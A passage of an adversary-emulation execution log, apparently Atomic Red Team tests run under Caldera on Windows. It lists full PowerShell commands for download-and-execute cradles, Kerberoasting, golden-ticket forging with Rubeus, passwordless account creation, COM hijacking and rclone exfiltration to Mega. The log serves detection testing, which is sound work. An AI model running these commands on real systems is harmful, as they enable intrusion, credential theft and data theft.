                'These applications are not considered viruses, malware, or '
                'other types of threats, but might perform actions on '
                'endpoints that adversely affect their performance or use. '
                'This file is similar to EICAR test virus file, but is '
                'considered a Potentially Unwanted Application (PUA) instead '
                'of a VIRUS (i.e. not actually malicious, but is flagged as it '
                'to verify anti-pua protection).\n',
 'executor': 'psh',
 'link_id': 'cab5c966-7b18-4c59-86d8-4c968ebbbf3f',
 'name': 'Potentially Unwanted Applications (PUA)',
 'pid': 10248,
 'plaintext_command': 'Invoke-WebRequest '
                      'http://amtso.eicar.org/PotentiallyUnwanted.exe -OutFile '
                      '$env:TEMP/PotentiallyUnwanted.exe; & '
                      '"$env:TEMP/PotentiallyUnwanted.exe"',
 'platform': 'windows',
 'run': '2023-11-30T14:03:55Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1120__discovery__peripheral_device_discovery__941eb886a05444e588fd6c17d992df98__trial_1

atomic_ordering: ['941eb886a05444e588fd6c17d992df98']
------------------------------
{'ability_id': '941eb886a05444e588fd6c17d992df98',
 'agent_reported_time': '2023-11-11T13:09:38Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1120',
            'technique_name': 'Peripheral Device Discovery'},
 'command': "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; "
            'iex(new-object '
            "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); "
            'printercheck -noninteractive -consoleoutput',
 'delegated': '2023-11-30T04:24:37Z',
 'description': 'Search for printers / potential vulns using printercheck '
                'function of WinPwn',
 'executor': 'psh',
 'link_id': '2d743779-6e64-4829-a168-9750266cad72',
 'name': 'WinPwn - printercheck',
 'pid': 8144,
 'plaintext_command': "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; "
                      'iex(new-object '
                      "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); "
                      'printercheck -noninteractive -consoleoutput',
 'platform': 'windows',
 'run': '2023-11-30T04:24:45Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1204_002__execution__user_execution-_malicious_file__705c4b9714ce06223e7d7038cd332808__trial_1

atomic_ordering: ['705c4b9714ce06223e7d7038cd332808']
------------------------------
{'ability_id': '705c4b9714ce06223e7d7038cd332808',
 'agent_reported_time': '2023-11-11T13:10:37Z',
 'attack': {'tactic': 'execution',
            'technique_id': 'T1204.002',
            'technique_name': 'User Execution: Malicious File'},
 'command': '[Net.ServicePointManager]::SecurityProtocol = '
            '[Net.SecurityProtocolType]::Tls12; IEX (iwr '
            '"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" '
            '-UseBasicParsing); $macrocode = "   Open '
            '`"$("$env:temp\\art1204.bat")`" For Output As #1`n   Write #1, '
            '`"calc.exe`"`n   Close #1`n   a = Shell(`"cmd.exe /c $bat_path '
            '`", vbNormalFocus)`n"; Invoke-MalDoc -macroCode $macrocode '
            '-officeProduct Word',
 'delegated': '2023-11-30T14:59:25Z',
 'description': 'Microsoft Office creating then launching a .bat script from '
                'an AppData directory. The .bat file launches calc.exe when '
                'opened.',
 'executor': 'psh',
 'link_id': 'd8fc1142-8f9d-4dd2-8d54-664da92cb6db',
 'name': 'Office launching .bat file from AppData',
 'pid': 1028,
 'plaintext_command': '[Net.ServicePointManager]::SecurityProtocol = '
                      '[Net.SecurityProtocolType]::Tls12; IEX (iwr '
                      '"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" '
                      '-UseBasicParsing); $macrocode = "   Open '
                      '`"$("$env:temp\\art1204.bat")`" For Output As #1`n   '
                      'Write #1, `"calc.exe`"`n   Close #1`n   a = '
                      'Shell(`"cmd.exe /c $bat_path `", vbNormalFocus)`n"; '
                      'Invoke-MalDoc -macroCode $macrocode -officeProduct Word',
 'platform': 'windows',
 'run': '2023-11-30T15:00:09Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1059_001__execution__command_and_scripting_interpreter-_powershell__a935a79ba61ecb00458208b0bd5ef15e__trial_1

atomic_ordering: ['a935a79ba61ecb00458208b0bd5ef15e']
------------------------------
{'ability_id': 'a935a79ba61ecb00458208b0bd5ef15e',
 'agent_reported_time': '2023-11-11T13:10:07Z',
 'attack': {'tactic': 'execution',
            'technique_id': 'T1059.001',
            'technique_name': 'Command and Scripting Interpreter: PowerShell'},
 'command': '$RequiredModule = Get-Module -Name AtomicTestHarnesses '
            '-ListAvailable; if (-not $RequiredModule) {Install-Module -Name '
            'AtomicTestHarnesses -Scope CurrentUser -Force};  ;  '
            'Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType '
            'Hyphen -EncodedCommandParamVariation E -UseEncodedArguments '
            '-EncodedArgumentsParamVariation EncodedArguments -Execute '
            '-ErrorAction Stop',
 'delegated': '2023-11-28T07:00:25Z',
 'description': 'Executes powershell.exe with variations of the '
                '-EncodedCommand parameter with encoded arguments supplied',
 'executor': 'psh',
 'link_id': 'd7317291-4e8b-43cd-9639-c768f79060ec',
 'name': 'ATHPowerShellCommandLineParameter -EncodedCommand parameter '
         'variations with encoded arguments',
 'pid': 7344,
 'plaintext_command': '$RequiredModule = Get-Module -Name AtomicTestHarnesses '
                      '-ListAvailable; if (-not $RequiredModule) '
                      '{Install-Module -Name AtomicTestHarnesses -Scope '
                      'CurrentUser -Force};  ;  '
                      'Out-ATHPowerShellCommandLineParameter '
                      '-CommandLineSwitchType Hyphen '
                      '-EncodedCommandParamVariation E -UseEncodedArguments '
                      '-EncodedArgumentsParamVariation EncodedArguments '
                      '-Execute -ErrorAction Stop',
 'platform': 'windows',
 'run': '2023-11-28T07:01:06Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1136_001__persistence__create_account-_local_account__f39aace719f4cdcf8569001f7a25aabf__trial_1

atomic_ordering: ['f39aace719f4cdcf8569001f7a25aabf']
------------------------------
{'ability_id': 'f39aace719f4cdcf8569001f7a25aabf',
 'agent_reported_time': '2023-11-11T13:10:42Z',
 'attack': {'tactic': 'persistence',
            'technique_id': 'T1136.001',
            'technique_name': 'Create Account: Local Account'},
 'command': 'New-LocalUser -Name "T1136.001_PowerShell" -NoPassword',
 'delegated': '2023-11-30T10:48:58Z',
 'description': 'Creates a new user in PowerShell. Upon execution, details '
                'about the new account will be displayed in the powershell '
                'session. To verify the\n'
                'new account, run "net user" in powershell or CMD and observe '
                'that there is a new user named "T1136.001_PowerShell"\n',
 'executor': 'psh',
 'link_id': 'cf3907a2-8384-4342-9094-bcd4fece7ef8',
 'name': 'Create a new user in PowerShell',
 'pid': 7344,
 'plaintext_command': 'New-LocalUser -Name "T1136.001_PowerShell" -NoPassword',
 'platform': 'windows',
 'run': '2023-11-30T10:49:48Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1547_001__multiple__boot_or_logon_autostart_execution-_registry_run_keys_,_startup_folder__0a3220a423ed7c7804af6e3587ad8811__trial_1

atomic_ordering: ['0a3220a423ed7c7804af6e3587ad8811']
==============================
==============================
adversary_id: atomic__t1546__multiple__event_triggered_execution__6fb0cdea444d58a340896d606baf281a__trial_1

atomic_ordering: ['6fb0cdea444d58a340896d606baf281a']
------------------------------
{'ability_id': '6fb0cdea444d58a340896d606baf281a',
 'agent_reported_time': '2023-11-11T13:09:56Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1546',
            'technique_name': 'Event Triggered Execution'},
 'command': '$RemoteComputer = "localhost";  $PWord = ConvertTo-SecureString '
            '-String "P@ssword1" -AsPlainText -Force;  $Credential = '
            'New-Object -TypeName System.Management.Automation.PSCredential '
            '-ArgumentList "Administrator", $Pword;  $CimSession = '
            'New-CimSession -ComputerName $RemoteComputer -Credential '
            '$Credential;  $ProcessToStart = "calc.exe";  $Result = '
            'Invoke-CimMethod -CimSession $CimSession -ClassName Win32_Process '
            '-MethodName Create -Arguments @{CommandLine = $ProcessToStart};  '
            'if ($Result.ReturnValue -eq 0) {;      Write-Host "Process '
            'started successfully with Process ID: $($Result.ProcessId)";  } '
            'else {;      Write-Host "Failed to start the process. Error code: '
            '$($Result.ReturnValue)";  };  Remove-CimSession -CimSession '
            '$CimSession',
 'delegated': '2023-12-01T23:39:02Z',
 'description': 'The following Atomic will create a New-CimSession on a remote '
                'endpoint and start a process usnig Invoke-CimMethod.\n'
                'This is a novel way to perform lateral movement or to start a '
                'remote process.\n'
                'This does require WinRM to be enabled. The account performing '
                'the run will also need to be elevated.\n'
                'A successful execution will stdout that the process started. '
                'On the remote endpoint, wmiprvse.exe will spawn the given '
                'process.\n',
 'executor': 'psh',
 'link_id': '612596da-686d-4bb6-83e1-c97c048f272f',
 'name': 'WMI Invoke-CimMethod Start Process',
 'pid': 9388,
 'plaintext_command': '$RemoteComputer = "localhost";  $PWord = '
                      'ConvertTo-SecureString -String "P@ssword1" -AsPlainText '
                      '-Force;  $Credential = New-Object -TypeName '
                      'System.Management.Automation.PSCredential -ArgumentList '
                      '"Administrator", $Pword;  $CimSession = New-CimSession '
                      '-ComputerName $RemoteComputer -Credential $Credential;  '
                      '$ProcessToStart = "calc.exe";  $Result = '
                      'Invoke-CimMethod -CimSession $CimSession -ClassName '
                      'Win32_Process -MethodName Create -Arguments '
                      '@{CommandLine = $ProcessToStart};  if '
                      '($Result.ReturnValue -eq 0) {;      Write-Host "Process '
                      'started successfully with Process ID: '
                      '$($Result.ProcessId)";  } else {;      Write-Host '
                      '"Failed to start the process. Error code: '
                      '$($Result.ReturnValue)";  };  Remove-CimSession '
                      '-CimSession $CimSession',
 'platform': 'windows',
 'run': '2023-12-01T23:39:52Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1553_004__defense-evasion__subvert_trust_controls-_install_root_certificate__9d21f3b551b40fa40056af1244af56ee__trial_1

atomic_ordering: ['9d21f3b551b40fa40056af1244af56ee']
------------------------------
{'ability_id': '9d21f3b551b40fa40056af1244af56ee',
 'agent_reported_time': '2023-11-11T13:10:03Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1553.004',
            'technique_name': 'Subvert Trust Controls: Install Root '
                              'Certificate'},
 'command': 'IEX (IWR '
            "'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' "
            '-UseBasicParsing)',
 'delegated': '2023-12-02T19:39:45Z',
 'description': 'The following Atomic test simulates adding a generic '
                'non-malicious certificate to the CurrentUser certificate '
                'store. This behavior generates a registry modification that '
                'adds the cloned root CA certificate in the keys outlined in '
                'the blog.\n'
                'Keys will look like - \\SystemCertificates\\CA\\Certificates '
                'or \\SystemCertificates\\Root\\Certificates\n'
                'Reference: '
                'https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec\n',
 'executor': 'psh',
 'link_id': '64973c2a-f2b6-46c9-94fa-bdedb0dbd4fa',
 'name': 'Add Root Certificate to CurrentUser Certificate Store',
 'pid': 6640,
 'plaintext_command': 'IEX (IWR '
                      "'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' "
                      '-UseBasicParsing)',
 'platform': 'windows',
 'run': '2023-12-02T19:40:16Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1558_001__credential-access__steal_or_forge_kerberos_tickets-_golden_ticket__107a14acdd84a7d6e7c891177b0db3aa__trial_1

atomic_ordering: ['107a14acdd84a7d6e7c891177b0db3aa']
------------------------------
{'ability_id': '107a14acdd84a7d6e7c891177b0db3aa',
 'agent_reported_time': '2023-11-11T13:10:33Z',
 'attack': {'tactic': 'credential-access',
            'technique_id': 'T1558.001',
            'technique_name': 'Steal or Forge Kerberos Tickets: Golden Ticket'},
 'command': 'Remove-Item $env:TEMP\\golden.bat -ErrorAction Ignore; '
            'Remove-Item $env:TEMP\\golden.txt -ErrorAction Ignore; cmd.exe /c '
            '"$Env:temp\\rubeus.exe" golden '
            '/aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 '
            "/ldap /user:$ENV:username /dc:$($ENV:logonserver.TrimStart('\\') "
            '+ "." + "$ENV:userdnsdomain") /printcmd /outfile:golden; '
            '$filename = (Get-ChildItem | ? {$_.Name.startswith("golden_")} | '
            'Sort-Object -Descending -Property LastWriteTime | select -First '
            '1).Name; @"; >%TEMP%\\golden.txt 2>&1 (;   echo Purge existing '
            'tickets and create golden ticket:;   klist purge;   cd %temp%;   '
            '"$Env:temp\\rubeus.exe" ptt /ticket:kirbifile;   echo.;   echo '
            "Requesting SYSVOL:;   dir \\\\$($ENV:logonserver.TrimStart('\\') "
            '+ "." + "$ENV:userdnsdomain")\\SYSVOL;   ;   echo.;   echo '
            'Tickets after requesting SYSVOL:;   klist;   echo.;   echo End of '
            'Golden Ticket attack; ); "@ -Replace "kirbifile", $filename | '
            'Out-File -Encoding OEM $env:TEMP\\golden.bat; echo "foo" | runas '
            '/netonly /user:fake "$env:TEMP\\golden.bat" | Out-Null; do {;   '
            'Start-Sleep 1;   Get-Content -Path "$env:TEMP\\golden.txt" -Wait '
            "| ForEach-Object {;     if ($_ -match 'End of Golden Ticket "
            "attack') { break } ;   }; } while ($false); Get-Content "
            '$env:TEMP\\golden.txt; Remove-Item $env:TEMP\\golden.bat '
            '-ErrorAction Ignore; Remove-Item $env:TEMP\\golden.txt '
            '-ErrorAction Ignore',
 'delegated': '2023-12-03T04:44:09Z',
 'description': 'Once the hash of the special krbtgt user is retrieved it is '
                'possible to craft Kerberos Ticket Granting Ticket '
                'impersonating any user in the Active Directory domain.\n'
                'This test crafts a Golden Ticket and then performs an SMB '
                'request with it for the SYSVOL share, thus triggering a '
                'service ticket request (event ID 4769).\n'
                'The generated ticket is injected in a new empty Windows '
                'session and discarded after, so it does not pollute the '
                'current Windows session.\n',
 'executor': 'psh',
 'link_id': '9f867e44-62b1-48f5-b0d8-dc86e3368697',
 'name': 'Crafting Active Directory golden tickets with Rubeus',
 'pid': 3728,
 'plaintext_command': 'Remove-Item $env:TEMP\\golden.bat -ErrorAction Ignore; '
                      'Remove-Item $env:TEMP\\golden.txt -ErrorAction Ignore; '
                      'cmd.exe /c "$Env:temp\\rubeus.exe" golden '
                      '/aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 '
                      '/ldap /user:$ENV:username '
                      '/dc:$($ENV:logonserver.TrimStart(\'\\\') + "." + '
                      '"$ENV:userdnsdomain") /printcmd /outfile:golden; '
                      '$filename = (Get-ChildItem | ? '
                      '{$_.Name.startswith("golden_")} | Sort-Object '
                      '-Descending -Property LastWriteTime | select -First '
                      '1).Name; @"; >%TEMP%\\golden.txt 2>&1 (;   echo Purge '
                      'existing tickets and create golden ticket:;   klist '
                      'purge;   cd %temp%;   "$Env:temp\\rubeus.exe" ptt '
                      '/ticket:kirbifile;   echo.;   echo Requesting '
                      "SYSVOL:;   dir \\\\$($ENV:logonserver.TrimStart('\\') + "
                      '"." + "$ENV:userdnsdomain")\\SYSVOL;   ;   echo.;   '
                      'echo Tickets after requesting SYSVOL:;   klist;   '
                      'echo.;   echo End of Golden Ticket attack; ); "@ '
                      '-Replace "kirbifile", $filename | Out-File -Encoding '
                      'OEM $env:TEMP\\golden.bat; echo "foo" | runas /netonly '
                      '/user:fake "$env:TEMP\\golden.bat" | Out-Null; do {;   '
                      'Start-Sleep 1;   Get-Content -Path '
                      '"$env:TEMP\\golden.txt" -Wait | ForEach-Object {;     '
                      "if ($_ -match 'End of Golden Ticket attack') { break } "
                      ';   }; } while ($false); Get-Content '
                      '$env:TEMP\\golden.txt; Remove-Item '
                      '$env:TEMP\\golden.bat -ErrorAction Ignore; Remove-Item '
                      '$env:TEMP\\golden.txt -ErrorAction Ignore',
 'platform': 'windows',
 'run': '2023-12-03T04:44:45Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1046__discovery__network_service_discovery__45aa13ed61bbe98aaf9324ce8044c860__trial_1

atomic_ordering: ['45aa13ed61bbe98aaf9324ce8044c860']
------------------------------
{'ability_id': '45aa13ed61bbe98aaf9324ce8044c860',
 'agent_reported_time': '2023-11-11T13:10:44Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1046',
            'technique_name': 'Network Service Discovery'},
 'command': 'nmap 127.0.0.1',
 'delegated': '2023-11-27T18:07:19Z',
 'description': 'Scan ports to check for listening ports for the local host '
                '127.0.0.1',
 'executor': 'psh',
 'link_id': 'cce45076-c7b4-432f-9502-f183e009778c',
 'name': 'Port Scan NMap for Windows',
 'pid': 380,
 'plaintext_command': 'nmap 127.0.0.1',
 'platform': 'windows',
 'run': '2023-11-27T18:08:05Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1558_003__credential-access__steal_or_forge_kerberos_tickets-_kerberoasting__efdca41c8a098f89f2db9c334627d8ac__trial_1

atomic_ordering: ['efdca41c8a098f89f2db9c334627d8ac']
------------------------------
{'ability_id': 'efdca41c8a098f89f2db9c334627d8ac',
 'agent_reported_time': '2023-11-11T13:09:52Z',
 'attack': {'tactic': 'credential-access',
            'technique_id': 'T1558.003',
            'technique_name': 'Steal or Forge Kerberos Tickets: Kerberoasting'},
 'command': "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; "
            'iex(new-object '
            "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); "
            'Kerberoasting -consoleoutput -noninteractive',
 'delegated': '2023-12-03T07:18:47Z',
 'description': 'Kerberoasting technique via function of WinPwn',
 'executor': 'psh',
 'link_id': 'c274d996-d694-4ec3-8535-42258377258b',
 'name': 'WinPwn - Kerberoasting',
 'pid': 4688,
 'plaintext_command': "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; "
                      'iex(new-object '
                      "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); "
                      'Kerberoasting -consoleoutput -noninteractive',
 'platform': 'windows',
 'run': '2023-12-03T07:19:10Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1552_005__credential-access__unsecured_credentials-_cloud_instance_metadata_api__d27398e945aa13a0812450cd48815572__trial_1

atomic_ordering: ['d27398e945aa13a0812450cd48815572']
==============================
==============================
adversary_id: atomic__t1482__discovery__domain_trust_discovery__feb9647c55185e3b6045293fd26f6a5b__trial_1

atomic_ordering: ['feb9647c55185e3b6045293fd26f6a5b']
------------------------------
{'ability_id': 'feb9647c55185e3b6045293fd26f6a5b',
 'agent_reported_time': '2023-11-11T13:09:57Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1482',
            'technique_name': 'Domain Trust Discovery'},
 'command': '[Net.ServicePointManager]::SecurityProtocol = '
            '[Net.SecurityProtocolType]::Tls12; IEX (IWR '
            "'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' "
            '-UseBasicParsing); Get-ForestTrust -Verbose',
 'delegated': '2023-12-01T08:08:10Z',
 'description': 'Utilizing PowerView, run Get-ForestTrust to identify forest '
                'trusts. Upon execution, progress and info about forest trusts '
                'within the domain being scanned will be displayed.\n',
 'executor': 'psh',
 'link_id': 'fb187f99-1a66-463b-9b00-714fb62aef9f',
 'name': 'Get-ForestTrust with PowerView',
 'pid': 2456,
 'plaintext_command': '[Net.ServicePointManager]::SecurityProtocol = '
                      '[Net.SecurityProtocolType]::Tls12; IEX (IWR '
                      "'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' "
                      '-UseBasicParsing); Get-ForestTrust -Verbose',
 'platform': 'windows',
 'run': '2023-12-01T08:08:38Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1218_009__defense-evasion__signed_binary_proxy_execution-_regsvcs,regasm__78931aaa8e328d30a3e47f61e2899b3b__trial_1

atomic_ordering: ['78931aaa8e328d30a3e47f61e2899b3b']
------------------------------
{'ability_id': '78931aaa8e328d30a3e47f61e2899b3b',
 'agent_reported_time': '2023-11-11T13:10:07Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1218.009',
            'technique_name': 'Signed Binary Proxy Execution: Regsvcs/Regasm'},
 'command': '$key = '
            "'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='; "
            '$Content = [System.Convert]::FromBase64String($key); Set-Content '
            '$env:Temp\\key.snk -Value $Content -Encoding Byte; '
            'C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe '
            '/r:System.EnterpriseServices.dll /out:"$Env:TEMP\\T1218.009.dll" '
            '/target:library /keyfile:$env:Temp\\key.snk aaaa08_T1218.009.cs; '
            'C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe '
            '$Env:TEMP\\T1218.009.dll',
 'delegated': '2023-12-01T01:59:16Z',
 'description': 'Executes the Uninstall Method, No Admin Rights Required, '
                'Requires SNK. Upon execution, "I shouldn\'t really execute" '
                'will be displayed\n'
                'along with other information about the assembly being '
                'installed.\n',
 'executor': 'psh',
 'link_id': '6712ddd9-7600-4262-a5fb-eaf21e7aa56f',
 'name': 'Regsvcs Uninstall Method Call Test',
 'pid': 9200,
 'plaintext_command': '$key = '
                      "'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='; "
                      '$Content = [System.Convert]::FromBase64String($key); '
                      'Set-Content $env:Temp\\key.snk -Value $Content '
                      '-Encoding Byte; '
                      'C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe '
                      '/r:System.EnterpriseServices.dll '
                      '/out:"$Env:TEMP\\T1218.009.dll" /target:library '
                      '/keyfile:$env:Temp\\key.snk aaaa08_T1218.009.cs; '
                      'C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe '
                      '$Env:TEMP\\T1218.009.dll',
 'platform': 'windows',
 'run': '2023-12-01T02:00:12Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1136_003__persistence__create_account-_cloud_account__20e4f555f0b87421c9e9ec83d99eb562__trial_1

atomic_ordering: ['20e4f555f0b87421c9e9ec83d99eb562']
==============================
==============================
adversary_id: atomic__t1546_015__multiple__event_triggered_execution-_component_object_model_hijacking__d94bcdfc9d0f769b062e1960f7af6804__trial_1

atomic_ordering: ['d94bcdfc9d0f769b062e1960f7af6804']
------------------------------
{'ability_id': 'd94bcdfc9d0f769b062e1960f7af6804',
 'agent_reported_time': '2023-11-11T13:09:56Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1546.015',
            'technique_name': 'Event Triggered Execution: Component Object '
                              'Model Hijacking'},
 'command': '$o= '
            '[activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39")); '
            '$item = $o.Item(); '
            '$item.Document.Application.ShellExecute("cmd.exe","/c '
            'calc.exe","C:\\windows\\system32",$null,0)',
 'delegated': '2023-12-01T22:22:21Z',
 'description': 'Use the PowerShell to execute COM CLSID object.\n'
                'Reference: '
                'https://pentestlab.blog/2020/05/20/persistence-com-hijacking/',
 'executor': 'psh',
 'link_id': '86727589-d3a0-44af-8058-c6b20b8a34f0',
 'name': 'Powershell Execute COM Object',
 'pid': 10428,
 'plaintext_command': '$o= '
                      '[activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39")); '
                      '$item = $o.Item(); '
                      '$item.Document.Application.ShellExecute("cmd.exe","/c '
                      'calc.exe","C:\\windows\\system32",$null,0)',
 'platform': 'windows',
 'run': '2023-12-01T22:22:31Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1567_002__exfiltration__exfiltration_over_web_service-_exfiltration_to_cloud_storage__9995c62a6263a14ae3b60fe2bb52e67a__trial_1

atomic_ordering: ['9995c62a6263a14ae3b60fe2bb52e67a']
------------------------------
{'ability_id': '9995c62a6263a14ae3b60fe2bb52e67a',
 'agent_reported_time': '2023-11-11T13:10:43Z',
 'attack': {'tactic': 'exfiltration',
            'technique_id': 'T1567.002',
            'technique_name': 'Exfiltration Over Web Service: Exfiltration to '
                              'Cloud Storage'},
 'command': 'New-Item $env:appdata\\rclone -ItemType directory; New-Item '
            '$env:appdata\\rclone\\rclone.conf; cd '
            '"PathToAtomicsFolder\\..\\ExternalPayloads\\T1567.002\\rclone-v*\\"; '
            '.\\rclone.exe config create T1567002 mega; set-Content '
            '$env:appdata\\rclone\\rclone.conf "[T1567002] `n type = mega `n '
            'user = atomictesting@outlook.com `n pass = '
            'vmcjt1A_LEMKEXXy0CKFoiFCEztpFLcZVNinHA"; .\\rclone.exe copy '
            '--max-size 1700k '
            '"PathToAtomicsFolder\\..\\ExternalPayloads\\T1567.002" '
            'T1567002:test -v',
 'delegated': '2023-12-03T21:50:17Z',
 'description': 'This test uses rclone to exfiltrate data to a remote cloud '
                'storage instance. (Mega)\n'
                'See '
                'https://thedfirreport.com/2022/06/16/sans-ransomware-summit-2022-can-you-detect-this/\n',
 'executor': 'psh',
 'link_id': '81904a86-88d6-4bcb-b560-25cbc36de465',
 'name': 'Exfiltrate data with rclone to cloud Storage - Mega (Windows)',
 'pid': 6340,
 'plaintext_command': 'New-Item $env:appdata\\rclone -ItemType directory; '
                      'New-Item $env:appdata\\rclone\\rclone.conf; cd '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads\\T1567.002\\rclone-v*\\"; '
                      '.\\rclone.exe config create T1567002 mega; set-Content '
                      '$env:appdata\\rclone\\rclone.conf "[T1567002] `n type = '
                      'mega `n user = atomictesting@outlook.com `n pass = '
                      'vmcjt1A_LEMKEXXy0CKFoiFCEztpFLcZVNinHA"; .\\rclone.exe '
                      'copy --max-size 1700k '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads\\T1567.002" '
                      'T1567002:test -v',
 'platform': 'windows',
 'run': '2023-12-03T21:51:06Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1090_003__command-and-control__proxy-_multi-hop_proxy__f21623deb932dc0db3f00068ba15bf32__trial_1

